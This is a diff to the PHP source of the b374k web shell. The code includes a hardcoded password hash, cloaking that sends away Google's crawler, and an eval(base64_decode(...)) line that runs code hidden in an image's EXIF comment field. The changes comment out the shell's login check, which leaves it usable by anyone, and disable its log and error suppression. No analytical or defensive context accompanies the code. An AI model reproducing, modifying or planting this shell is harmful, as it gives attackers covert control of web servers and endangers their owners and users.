@@ -3,6 +3,7 @@
 /* (Web Shell b374k r3c0d3d by x'1n73ct|default pass:" 1n73ction ") */ 
 $auth_pass = "9c80a1eaca699e2fc6b994721f8703bc"; 
 $color = "#00ff00"; 
+$d = '';
 $default_action = 'FilesMan'; 
 @define('SELF_PATH', __FILE__); 
 if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { 
@@ -10,14 +11,14 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
     exit; 
 } 
 @session_start(); 
-@error_reporting(0); 
-@ini_set('error_log',NULL); 
-@ini_set('log_errors',0); 
-@ini_set('max_execution_time',0);
-@ini_set('output_buffering',0); 
-@ini_set('display_errors', 0);
-@set_time_limit(0); 
-@set_magic_quotes_runtime(0); 
+// @error_reporting(0); 
+// @ini_set('error_log',NULL); 
+// @ini_set('log_errors',0); 
+// @ini_set('max_execution_time',0);
+// @ini_set('output_buffering',0); 
+// @ini_set('display_errors', 0);
+// @set_time_limit(0); 
+// @set_magic_quotes_runtime(0); 
 @define('VERSION', '2.1'); 
 if( get_magic_quotes_gpc() ) { 
     function stripslashes_array($array) { 
@@ -43,12 +44,12 @@ eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
     <?php 
     exit; 
 } 
-if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
-    if( empty( $auth_pass ) || 
-        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
-        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
-    else 
-        printLogin();
+// if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
+//     if( empty( $auth_pass ) || 
+//         ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $auth_pass ) ) ) 
+//         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
+//     else 
+//         printLogin();
 		
 @ini_set('log_errors',0);
 @ini_set('output_buffering',0);	
@@ -139,6 +140,7 @@ else {
 	// find drive letters
  	$v = explode("\\",$d); 
 	$v = $v[0]; 
+	$letters = '';
  	foreach (range("A","Z") as $letter) 
  	{ 
 	  $bool = @is_dir($letter.":\\");
